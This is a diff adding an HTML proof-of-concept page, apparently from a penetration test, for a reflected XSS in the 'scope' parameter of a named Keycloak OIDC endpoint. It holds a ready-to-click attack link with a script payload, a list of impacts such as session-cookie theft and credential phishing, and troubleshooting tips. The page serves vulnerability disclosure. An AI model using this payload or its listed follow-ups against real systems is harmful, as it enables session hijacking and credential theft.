@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Reflected XSS PoC - idp.pt.2c8.com</title>
+    <style>
+        body { font-family: monospace; margin: 2em; background: #1a1a1a; color: #0f0; }
+        a { color: #f90; font-size: 1.2em; }
+        pre { background: #000; padding: 1em; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
+        h1 { color: #f90; }
+    </style>
+</head>
+<body>
+    <h1>Reflected XSS PoC — Keycloak OIDC Endpoint</h1>
+    <p>Target: idp.pt.2c8.com (Keycloak realm 2c8)</p>
+    <p>Parameter: <code>scope</code></p>
+    <p>The payload is reflected unmodified in a text/html error page with no Content-Security-Policy header.</p>
+
+    <h2>Click to trigger:</h2>
+    <p><a href="https://idp.pt.2c8.com/auth/realms/2c8/protocol/openid-connect/auth?response_type=code&client_id=2c8-portal&redirect_uri=https%3A%2F%2Flic.pt.2c8.com%2Fportal%2Fapi%2Fv2%2Foauth%2Fcallback&scope=openid%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&state=test&nonce=test&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256">Run XSS PoC (alert box)</a></p>
+
+    <h2>Expected result:</h2>
+    <p>A JavaScript alert box showing <code>idp.pt.2c8.com</code>, proving script execution in the IDP's origin.</p>
+
+    <h2>Impact:</h2>
+    <pre>
+XSS on idp.pt.2c8.com executes in the Keycloak IDP origin.
+An attacker can:
+- Steal Keycloak session cookies (AUTH_SESSION_ID)
+- Access the idp-web API as the victim (same-origin)
+- Redirect the OIDC flow to capture authorization codes
+- Phish credentials by injecting a fake login form
+    </pre>
+
+    <h2>Note:</h2>
+    <p>The scanner noted a redirect occurs between the attack request and the response.
+    The browser follows this redirect automatically. If the alert does not appear,
+    the redirect may have changed — check the final response in DevTools (F12 → Network tab).</p>
+</body>
+</html>
